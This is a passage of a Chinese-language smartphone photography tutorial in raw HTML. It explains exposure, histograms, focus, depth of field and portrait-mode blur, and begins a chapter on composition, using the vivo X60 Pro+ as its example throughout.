确定的曝光值（EV）</b></p>\n<p>需要注意的是，这里的加号只是关联的关系，并不是真正的加法。通过这个公式我们可以知道，在调整曝光时，如果我们目前曝光值是正确的，那么我们还想要调整快门速度时间变长，就需要再相应的调整感光值降低平衡画面的亮度。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-bef1bfc23b9a727b7ecedcb54817a5ee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic3.zhimg.com/v2-bef1bfc23b9a727b7ecedcb54817a5ee_r.jpg\"></figure><p>一个最生动的例子就是车轨摄影。</p>\n<p>我们想要画面中车有轨迹流动，就需要快门时间延长，但是一旦延长画面就会变亮，此时就需要降低感光值来让画面变暗。所以你看，只要你从原理角度去真正了解曝光，其实曝光是非常好理解的。</p>\n<p>但既然是通用准则，那么 18% 灰这个参考就有失效的时候。比如如果画面中的黑白比例差别较大，就容易出现曝光不准确的情况。</p>\n<p>一个最为经典的案例就是当我们面对太阳逆光拍摄的时候，是不是很容易出现人脸黑的情况。这就是因为画面中亮部白色过多，为了 18% 平衡权重，就会压低整个曝光。这个时候，我们就需要主动去提高曝光，这就是摄影师提到的曝光补偿。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-0e6ebe60e98eb16710dce4618101175c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-0e6ebe60e98eb16710dce4618101175c_r.jpg\"></figure><p>而这个曝光补偿按钮，其实你也在 vivo X60 Pro+ 的专业模式里见过，就是画面中的这个 EV。当你调整 EV 的时候，我们看到画面整体变亮或是变暗。</p>\n<p>不过即使到这里，曝光还是一个比较抽象的概念，到底怎么样曝光好像只能凭感觉。别急，还有一个本章节最为重要的知识点，这就是曝光的真正标尺：</p>\n<p><b>直方图。</b></p>\n<p>我们知道画面中的像素无非就是从最暗到最亮的像素组成，最暗就是黑色，最亮就是白色。那么如果我们以亮度作为横坐标，对应亮度的像素数量作为纵坐标，就可以获得一张画面中曝光信息的「分布图」，这就是直方图。</p>\n<p>我们其实可以直接通过下面三张不同曝光倾向的图里，就可以看到不同的直方图类型。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-886b16d28b3a4ff91ac0837d6a3ae9ea_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"2274\" class=\"origin_image zh-lightbox-thumb\" width=\"3032\" data-original=\"https://pic3.zhimg.com/v2-886b16d28b3a4ff91ac0837d6a3ae9ea_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9dc0e415f3a7a3f58ce496675619ed51_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"2274\" class=\"origin_image zh-lightbox-thumb\" width=\"3032\" data-original=\"https://pic2.zhimg.com/v2-9dc0e415f3a7a3f58ce496675619ed51_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3359155ef3006231fc0f6ea54cbcf87c_b.jpg\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"2274\" class=\"origin_image zh-lightbox-thumb\" width=\"3032\" data-original=\"https://pic1.zhimg.com/v2-3359155ef3006231fc0f6ea54cbcf87c_r.jpg\"><figcaption>三种不同倾向的曝光</figcaption></figure><p>那么在这三张直方图中，图二显然就是前面提到的正确曝光的直方图。因为在这个直方图中我们可以看到画面中绝大多数像素集中在中间画面，暗部和亮部也有对应的信息。</p>\n<p>而图一，画面的像素都集中在左侧的暗部，自然就是曝光不足。</p>\n<p>图三，画面中的像素都集中在右侧的亮部，自然就是曝光过度。</p>\n<p>所以我们在拍照的时候，完全就可以通过直方图来判断曝光情况。尤其是在一些极限环境中，比如太阳强烈，你根本无法确认屏幕中曝光情况，此时就可以通过直方图了解。而这个直方图，其实很多手机的专业模式都有配备，比如 vivo X60 Pro+ 就可以在专业模式的设置中打开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f134ad2cf4e8da4a3f81585bbfa910f1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-f134ad2cf4e8da4a3f81585bbfa910f1_r.jpg\"></figure><p>而说到这里，你就需要知道一个词了，这个词就是「影调」。</p>\n<h3>光的高低</h3>\n<p>显然，所谓的影调这个「调」字，和我前面所说的韵律是一样的，依然是借鉴于音乐。就算我不是一个懂音乐的人一说调子，我也知道「低调」或者是「高调」一说。那其实所谓的影调也是如此，我们上述举例的曝光不足的这张图，就是典型的低调作品。</p>\n<p>那么什么是高调作品呢，比如下面这一张：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-287805c67aa0794cbeaa05ab3752eefc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic1.zhimg.com/v2-287805c67aa0794cbeaa05ab3752eefc_r.jpg\"></figure><p>而所谓的高中低调作品它们对应的直方图，如图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-bf440c5803e821439e1162a6cde4c866_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"506\" data-rawheight=\"200\" class=\"origin_image zh-lightbox-thumb\" width=\"506\" data-original=\"https://pic3.zhimg.com/v2-bf440c5803e821439e1162a6cde4c866_r.jpg\"></figure><p>这就是为什么我说直方图就是曝光的指南针，因为它可以直接用直观的方式给我们展示影调。而至于选择哪一种影调，就是我们自己来决定的。</p>\n<p>讲到这里，也是时候总结了。而这里的总结也很简单，现在你只要打开你的手机中的专业模式，比如我手里的 vivo X60 Pro+，在这个界面里：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2ba1cf3cc12db3513a30f3923fd36ec1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-2ba1cf3cc12db3513a30f3923fd36ec1_r.jpg\"></figure><ul>\n<li>\n<b>EV：</b>调整曝光倾向</li>\n<li>\n<b>ISO：</b>感光值，数值越大，画面越亮，但是画质降低，反之亦然。</li>\n<li>\n<b>S：</b>快门速度，时间越长，画面越亮，但是画面中的物体会有拖影，反之亦然。</li>\n<li>\n<b>WB：</b>白平衡，之前虽然没有提到，但是用起来也很简单，你只要知道可以让颜色变冷或者是变暖即可。</li>\n<li>\n<b>AF：</b>对焦模式切换，后面会有章节讲到。</li>\n<li>\n<b>Raw：</b>曝光的原始信息格式，后期空间大，但是一定要后期，而且需要更多的存储空间。</li>\n<li>\n<b>直方图：</b>曝光的参考标尺，可以让自己了解画面的曝光情况，并且配合拍摄对应的影调。</li>\n</ul>\n<p>曝光知识是整个摄影知识的基础，不过好在它至少具有一定逻辑，甚至是有迹可循。但是对于曝光的理解，往往是摄影师作品风格的基础。比如，一些清新系人像，他们的直方图都是高调的直方图。所以这部分知识，如果你一次没有弄懂，一定多阅读，多尝试。</p>\n<p>只有深刻了解曝光，才能真正的绘制光线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-066b6f1983977a086336bacee66d0fe1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-066b6f1983977a086336bacee66d0fe1_r.jpg\"></figure><p>当然我知道很多人刚开始学习摄影时，对于光线并不敏感。这里有一个很重要的建议，这就是你可以先从黑白摄影开始。因为黑白摄影就是纯粹的亮度信息，我们就是要通过控制画面的明暗来展示内容。所以对于曝光的选择，就决定了一张作品的与众不同。其实关于影调，还有「长和短」的概念，这里篇幅的问题，就算留给你的课后作业，但请一定要去了解，一定收获颇丰。</p>\n<p>不过虽然现在你已经学会了使用手动模式进行拍照，调整参数控制画面的明暗，但也不意味着每一张照片都需要使用手动模式拍摄。其实恰恰相反，手动模式一般都是特殊场景，比如星空、光绘场景中使用。而大多数生活中场景我们完全可以信任手机自己的自动曝光。不过这种信任是有限的，我们依然需要对手机自动的曝光结果进行控制。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-537e8404d95bb4ce2b3ed9dee563cb96_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic3.zhimg.com/v2-537e8404d95bb4ce2b3ed9dee563cb96_r.jpg\"></figure><p>比如我们可以通过点按手机的拍摄界面不同位置，来干预曝光。比如点击画面中较亮的地方，整个画面就会变暗。点击画面中较暗的地方，整个画面就会变亮。或者我们可以在点按画面以后，调节曝光滑杆来进行调节。而这种方式也是最常见的控制曝光的方式，几乎所有本文出现的照片都是使用这种曝光方式来拍摄。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6d8788cf35e3d44063304f43d5473025_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-6d8788cf35e3d44063304f43d5473025_r.jpg\"></figure><p>我自己的一个习惯就是点按画面以后，略微压低一点曝光。不要小看这个操作，就是这样一个简单操作会对你照片的质感有着非常明显的提升。因为目前所有的手机出发点还是记录，所以它的曝光倾向都是为了保证信息充足而尽可能的亮。但这会缺少影调，甚至是让颜色失真。</p>\n<p>不信，你现在打开手机，自动拍摄一张照片，然后再手动调节降低一点曝光进行拍摄。你会发现两张照片的影调、细腻度、色彩感，完全不一致。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2745b086dc1edaa00b6aac56869300a7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-2745b086dc1edaa00b6aac56869300a7_r.jpg\"></figure><p>每一次按下快门，其实都是对「光」进行一次捕捉。当你真的可以掌握曝光的时候，你会发现整个世界都是你的画布。记住：</p>\n<p>「从来没有什么正确的曝光，有的只有你心里想要的曝光。」</p>\n<h2>05. 虚与实</h2>\n<p>这一章节我们将会聚焦在一件事上，这就是「对焦」。</p>\n<p>说到对焦，对于一些手机用户是非常陌生的，但是对于很多相机用户来说是再熟悉不过，因为所有的专业相机，对焦都是一个重要的衡量参数。但这不是说手机不需要对焦，而是手机一方面因为传感器面积小，所以景深比较深，另一方面如今的数码相机自动对焦能力很强，所以感知不明显。</p>\n<p>但是随着手机硬件规格的提高，尤其是这几年手机的传感器面积越来越大，我们的手机也开始出现浅景深效果。比如本文中举例的 vivo X60 Pro+ 甚至是有接近一英寸的传感器面积，眼看就和卡片机的传感器大小一致了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-cb089ce1085d18697401ac69d32fd8a6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-cb089ce1085d18697401ac69d32fd8a6_r.jpg\"></figure><p>所以掌握对焦，就成为了今天很多手机摄影用户的分水岭。因为如果你能够了解景深原理，并加以利用，就能够拍摄出所谓的「相机氛围」。</p>\n<p>不过说到这里，你可能对景深这个词还非常陌生。但如果我换另外一个说法，你就懂了，这就是「虚化」。虚化就是景深变化的一个结果。不过为了让你更好的控制虚化，我们需要先从景深的具体概念开始。</p>\n<h3>景深</h3>\n<p>由于照片是二维的，但实际真实世界是三维的。假设我们的照片是二维坐标的 XY，所以当我们看到画面中有清晰，有模糊的时候会觉得清晰和模糊是在 XY 中选择。但其实，照片的清晰和模糊范围是在 Z 轴上进行选择，看图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-fe5a5f040f297cabdd74c78f7a3e8ebf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"589\" class=\"origin_image zh-lightbox-thumb\" width=\"940\" data-original=\"https://pic4.zhimg.com/v2-fe5a5f040f297cabdd74c78f7a3e8ebf_r.jpg\"></figure><p>通过上图我们可以清晰的了解到，景深其实就是一个清晰的范围。而相机所谓的对焦过程，就是把你想要拍摄的主体放置到这个清晰的范围中。</p>\n<p>这个清晰的范围越短，我们就叫做浅景深，那么背景的模糊虚化也就会越明显。清晰的范围越长，我们叫做深景深，那么背景的模糊虚化越不明显。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4b8ff5fdf2ac7e8b5c8640ec98d234e0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-4b8ff5fdf2ac7e8b5c8640ec98d234e0_r.jpg\"></figure><p>那么影响景深的范围（即 L 的长短）有哪些因素呢？</p>\n<ol>\n<li>镜头光圈，光圈越大，景深越小；光圈越小，景深越大。但目前主流手机的镜头光圈不可以修改，前文已经提到。</li>\n<li>焦距，焦距越长，景深越小；焦距越短，景深越大。这也是为什么等效 50mm 或者是等效 125mm 的两颗长焦镜头更适合拍摄人像，因为虚化好。</li>\n<li>对焦距离，在其它条件相同的情况下，对焦越近，景深越小。</li>\n<li>相机的传感器面积大小，传感器越大，景深越小，虚化越明显。</li>\n</ol>\n<p>在这几个因素中，摄影师可以调整的因素就是焦距和对焦距离。所以我们想要照片中实现虚化的效果，就可以从这两处下手。</p>\n<p>比如让镜头尽可能的接近被摄主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2b08b2e629cb44958b59e03b771ed9fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic3.zhimg.com/v2-2b08b2e629cb44958b59e03b771ed9fe_r.jpg\"></figure><p>最为经典的一个例子自然是拍摄树叶和花朵。如果我们离树叶和花朵比较远，那么画面很杂乱，但是当我们逐渐靠近，不仅可以拍摄到树叶的细节，树叶以外的背景还有非常好看的虚化光斑效果。</p>\n<p>不过需要说明的是，任何镜头由于物理法则，都有一个限制，这就是你不可能完全贴近物体对焦，任何镜头都会有「最小对焦距离」。</p>\n<p>当然，这种最小对焦距离可以通过特殊的光学设计来更缩短，比如 vivo X60 Pro+ 的微距模式，就是让最小对焦距离变短，从而实现微距效果。</p>\n<p>另一个获得虚化的方式就是使用长焦镜头。比如我们看使用 vivo X60 Pro+ 等效 50mm 焦距的镜头拍摄时镜头焦外非常明显。这非常有利于简化画面的同时，突出画面中的人物主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-920c021c40b072acdeba7c2f4aa2299c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-920c021c40b072acdeba7c2f4aa2299c_r.jpg\"></figure><p>以上两种方式，虽然能够达到不错的虚化效果，但对比相机的虚化效果还相差甚远。尤其是相机中大光圈镜头迷人的虚化焦外，往往决定了人像作品的质感。不过我也多次提到，手机的光圈不可以调整，所以我们也就无法获得这种效果。</p>\n<p>但人像模式的出现，打破了这一规则。</p>\n<h3>人像模式</h3>\n<p>虽然手机物理上无法实现大光圈虚化，但是我们可以「计算虚化」。而随着这几年手机摄影计算能力的进步，甚至是大多数情况已经可以做到「以假乱真」的虚化。即使还算作是有一定摄影经验的我自己，乍一看有时候也很难分辨两张照片是手机拍的还是相机拍的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-e8929836a7ebe0d858dd7dfc669a64ab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-e8929836a7ebe0d858dd7dfc669a64ab_r.jpg\"></figure><p>但是前提是，我们要学会利用人像模式。</p>\n<p><b>1. </b> <b>人像模式的虚化是可以调节的</b></p>\n<p>虽然目前手机的人像模式抠像算法已经非常准确，但是有件事依然需要我们自己做主，这就是虚化的程度。这就像是专业相机调整光圈一样，虚化程度需要我们自己控制。</p>\n<p>比如在 vivo X60 Pro+ 的人像模式中，我们是直接可以选择不同的光圈数值，实现不同的虚化效果。但是需要注意的是，这些调整需要我们在前期就做好决定，拍摄后无法更改。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-8388f464ca404ca347ebebf7c7b25fb8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic1.zhimg.com/v2-8388f464ca404ca347ebebf7c7b25fb8_r.jpg\"></figure><p><b>2. </b> <b>要自然，就要合理</b></p>\n<p>虽然是算法模拟的，但是想要手机的人像模式真实自然，其实依然需要遵循物理虚化的原理。比如我经常看到一些虚化明显的作品都是半身人像居多，很少有全身人像。这是因为想要全身人像，就意味着摄影师离拍摄主体相对较远，根据前面的原理可知，景深自然深，虚化不明显。</p>\n<p>所以如果我们使用人像模式拍摄全身照，如果虚化很猛烈，就会显得照片很假。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-93d7c0c4a03794a38787a1e52ba2257c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3120\" data-rawheight=\"4160\" class=\"origin_image zh-lightbox-thumb\" width=\"3120\" data-original=\"https://pic1.zhimg.com/v2-93d7c0c4a03794a38787a1e52ba2257c_r.jpg\"></figure><p>再举一例。</p>\n<p>很多人在拍照的时候，背景非常单一，比如是一面白墙。那么此时人像虚化，自然不够明显，因为这种场景即使是最大光圈的专业相机拍摄也不会好看，因为没有「虚化」的深度。所以想要好看的虚化建议就是：</p>\n<p>「尽可能的人物远离背景，或者是背景有着丰富的光源形成光斑。」</p>\n<p><b> 3. </b> <b>人像模式，也可以拍「东西」</b></p>\n<p>这也是一个很严重的误区，很多人觉得人像模式只能拍人像。但是实际上，今天的虚化算法早就是一个综合技术，不仅仅可以用来拍摄人像，用来拍摄美食、静物都是一个很好的选择。而这些主体使用人像模式最重要的好处就是可以极大的简化画面，突出主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-208727f44d022495dafa651ea2d3c15b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-208727f44d022495dafa651ea2d3c15b_r.jpg\"></figure><p><b>4. </b> <b>学会「玩转」焦外</b></p>\n<p>这一点其实特别有趣，因为这也是手机摄影和传统相机最大的不同，因为算法的想象力是无限的。比如其实不同镜头的焦外效果是不一样的。所以这也是为什么很多摄影师会买不同的镜头，因为它们焦外的味道不一样。尤其是一些老镜头，因为做工的问题，会让焦外有一定的特点，而这种特点会成为一种风格。比如蔡司的 Biotar 镜头，就会有一种有意思的焦外旋转。</p>\n<p>以前如果你想要获得这种效果，就需要找到对应的镜头，但因为今天是算法模拟，所以我们可以直接从算法入手，获得这种效果。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a523a2c6e0a2d4f31c0b94c192423cd4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-a523a2c6e0a2d4f31c0b94c192423cd4_r.jpg\"></figure><p>比如 vivo X60 Pro+ 中就可以直接选择这种 Biotar 的焦外风格。我自己是非常喜欢在人像模式中选择这种模式，因为这种焦外会有一种很独特的柔美感，特别适合一种温柔调性的人像拍摄。以前这种效果在 iPhone 上需要软件来实现，但是现在安卓手机厂商也注意到了这种独特美学，开始内置在相机之中。</p>\n<h3>手动控制对焦</h3>\n<p>说了效果以后，我们就要说说具体的操作。其实对于手机摄影来说，对焦操作是非常简单的，和曝光一样，我们可以：</p>\n<p><b>想要哪里清晰，就点哪里。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bce21ec3867292bbd9a03790f7bbc5cf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2386\" data-rawheight=\"3181\" class=\"origin_image zh-lightbox-thumb\" width=\"2386\" data-original=\"https://pic4.zhimg.com/v2-bce21ec3867292bbd9a03790f7bbc5cf_r.jpg\"></figure><p>而所谓的这个清晰，就是我们所说的把画面中的内容放置到景深范围里。不过虽然很多时候自动对焦反应已经足够迅速，但是还是会出现难对焦的情况，尤其是在一些弱光环境下。所以此时我们就可以选择手动对焦，而手动对焦的按钮就在专业模式里。</p>\n<p>只要我们点击专业模式的「AF」，就可以对焦模式进行切换。</p>\n<ul>\n<li>AF：自动对焦</li>\n<li>MF：手动对焦</li>\n</ul>\n<p>开启手动对焦以后，我们就可以通过画面滑杆调整画面中的清晰范围。最左侧就是最小对焦距离，而最右侧就是无限远。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5f79b1d82050ec3a4088a4404fc5ba79_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-5f79b1d82050ec3a4088a4404fc5ba79_r.jpg\"></figure><p>最好的一个实际使用场景案例就是在夜景星空拍摄中。由于夜空弱光，手机很难曝光，所以我们就可以直接手动调整曝光到右侧无限远按下快门即可，免去了「拉风箱」的对焦过程。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-35c18d6447be721b1453442ad425af1b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-35c18d6447be721b1453442ad425af1b_r.jpg\"></figure><p>当然，手动对焦的意义远不止于如此。手动对焦的出现可以让我们自如控制画面中的虚实。因为并不是只有「清晰锐利的照片才是好照片」。其实反而有些照片中，模糊带来的朦胧美更是有一番滋味。比如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-53ab07acc8f0279949df4cf4cffe4050_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3948\" data-rawheight=\"2961\" class=\"origin_image zh-lightbox-thumb\" width=\"3948\" data-original=\"https://pic1.zhimg.com/v2-53ab07acc8f0279949df4cf4cffe4050_r.jpg\"></figure><p>而想要拍摄这样的效果，就需要我们更改观察的方式，可以在不同的场景中，更换照片中的虚实试一试，也许会有完全不同的发现。</p>\n<p>其实这也是摄影学习给予我一个非常重要的经验。没有任何事物是绝对的，尤其是对于艺术表达来说更是如此。并不是正确的曝光就是美的曝光，并不是清晰的对焦就是美的对焦。</p>\n<p>很多时候，它会恰恰相反，尝试换一个角度思考记录，会是一个不一样的视界。</p>\n<h2>06. 构图的美</h2>\n<p>构图是这篇文章最后一个章节了，而显然这也会是整篇文章中最为艰难的一个章节，因为它真的非常抽象。之前的章节，至少每一项内容我们的手机中都会有对应的功能，也就是会有对应的抓手，让你可以操作。</p>\n<p>而这一章节的构图，却是只有靠自己的想象力实践。</p>\n<p>但是在构图之前，我特别想要问问你，你是否了解构图的真正含义。我之所以会提出这样的问题，是因为我发现对于构图很多人竟然仅仅是停留在「形式美」。大多数人只是粗浅的在潜意识里有一个印象，「这样的构图是好看的」。但是至于为什么会好看，则全然不知。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ff8e44247a26f7438663aaff9c9db27d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-ff8e44247a26f7438663aaff9c9db27d_r.jpg\"></figure><p>比如，构图最为经典的三分法，今天已经是人尽皆知，但是三分法为什么是一种有效的构图方式却很难描述。这其实是很多人构图学习的重要误区。因为这会带来一个许多入门摄影师常见的问题：</p>\n<p>「我这种构图对不对？」</p>\n<p>其实这个问题的答案已经不重要，而是只要你问出这个问题，就说明你并没有真正的了解构图。因此，我现在希望你做一件事，这就是忘记所有你在社交网络上学习的所谓「构图法则」。尤其是那些几分钟让你学构图的内容，我恳请你先放下构图的包袱，我们先来回到一个最基本的问题：</p>\n<p>「什么是好照片？」</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-3b761c5409a7c9bb37909d824e006039_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic2.zhimg.com/v2-3b761c5409a7c9bb37909d824e006039_r.jpg\"></figure><p>我们总是希望拍摄好照片，但却没有花时间去总结。其实随着你照片的阅读量逐渐提升，好照片其实都是有着很明确的共性，而如果你可以真正抓住这种共性，那你会发现自己的摄影水平似乎在一夜之间提高了。不过我也知道，你可能会说千人千面，每个人看待照片的感受不同。你可能说它颜色好，你可能说它光线好等等等。但这些都不是本质，其实真正的本质，早就已经写在教科书上了。</p>\n<p>在可能是全球最为流行的摄影教程书籍《纽约摄影学院》中，在书籍的开篇第一章就已经总结了一张好照片的三个要素，时至今日，我依然对这三句话牢记在心：</p>\n<ol>\n<li>一幅好照片要有一个鲜明的主题（有时也被称之为题材）。</li>\n<li>一幅好照片必须能把注意力引向被摄体；</li>\n<li>一幅好照片必须简洁。</li>\n</ol>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3a4ae293dd013484159adae5df4e9e63_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-3a4ae293dd013484159adae5df4e9e63_r.jpg\"></figure><p>你会发现，仅仅是短短的几十字，却精准描述了好照片的定义。你现在可以回想任何一张你心里的好照片，是不是都满足这三个要素。</p>\n<p>我们现在逐条回顾这三个要素：</p>\n<p>首先要有一个鲜明的主题，或者是其实也可以是主体。归根到底，就是在说你的这张照片本身至少要聚焦在「一件事、一个人、一个物品」上。这是我们在拍摄之前一定要做的思考。我经常看到很多人拍了很多照片，但是却不知道自己在拍什么。一个很重要的考察方式就是，你现在可以翻看一些照片，看看其中照片哪些你能明确的回想起自己在拍摄什么，而哪些即使现在的你自己也完全不知道拍摄的是什么。</p>\n<p>所以，每次按下快门，一定要问问自己，我在拍什么。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-4ee3a15304c26f20b9b8515fd533e6c6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-4ee3a15304c26f20b9b8515fd533e6c6_r.jpg\"></figure><p>而确定了拍什么以后，我们就要清楚「怎么拍」。第二句话已经给出了非常明显的答案：</p>\n<p><b>「引导注意力」。</b></p>\n<p>而这 5 个字，就是构图的意义，或者是说就是构图的根本目的。我们可以随便列举一种构图方式，比如我们刚刚所说的三分法。为什么我们要把人物放置在画面中的三分之一处，这是因为有数据显示，当我们观看照片时，我们的视觉第一落点往往是三分之一附近。</p>\n<p>也就是说，三分法的最终目的是寻找你注意力的第一落点。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-31cc84a354922eee9217109d3e34b5eb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-31cc84a354922eee9217109d3e34b5eb_r.jpg\"></figure><p>而第三句话，一幅好照片必须简洁，本质要做的也是「不要分散注意力」。</p>\n<p>到这里，我们发现一张好照片的三要素中，有两个都是主要由构图来完成。这也在某种意义上，证明的构图的重要性。而归根到底，所谓的构图，就是让照片的阅读者看到你想要传达的「主题」。</p>\n<p>所以你现在应该知道「我这个构图对不对」错在哪里了，因为对于任何一张照片，只要是能够做到上述两条的选择都是合适的构图。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-769f68e3a6f95f13b25027e944960f18_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" 